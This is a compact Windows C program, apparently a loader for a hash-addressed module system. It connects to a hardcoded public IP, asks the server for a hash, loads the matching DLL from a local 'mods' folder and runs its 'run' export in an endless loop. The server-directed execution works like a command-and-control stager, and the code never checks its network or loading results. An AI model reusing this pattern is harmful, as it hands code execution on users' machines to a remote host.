#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#pragma comment(lib,"ws2_32.lib")

typedef unsigned char u8;
typedef unsigned u32;
typedef u8 H[32];
typedef void (*Fn)();

__declspec(dllexport) SOCKET conn;
__declspec(dllexport) Fn imp;

void rd(void *b,u32 n){for(u8*p=b;n;){int r=recv(conn,(char*)p,n,0);p+=r;n-=r;}}
void op(u8 o,void*b,u32 n){u8 h[5]={o,n>>24,n>>16,n>>8,n};send(conn,(char*)h,5,0);send(conn,b,n,0);}
u8 *rx(){u8 h[5];rd(h,5);u32 n=(u32)h[1]<<24|h[2]<<16|h[3]<<8|h[4];u8*b=malloc(n);rd(b,n);return b;}
u8 *download(H h){op(3,h,32);return rx();}

__declspec(dllexport) void cvm_firstchild(H p,H c){op(5,p,32);u8*b=rx();memcpy(c,b+4,32);free(b);}
__declspec(dllexport) Fn find(H h){char p[75]="mods/";for(int i=0;i<32;i++)sprintf(p+5+i*2,"%02x",h[i]);strcat(p,".dll");return (Fn)GetProcAddress(LoadLibraryA(p),"run");}

int main(){WSADATA w;H h={0};struct sockaddr_in a={0};WSAStartup(0x202,&w);conn=socket(2,1,0);a.sin_family=2;a.sin_port=htons(9000);inet_pton(2,"118.25.42.70",&a.sin_addr);connect(conn,(void*)&a,sizeof a);cvm_firstchild(h,h);imp=find(*(H*)download(h));for(;;)imp();}
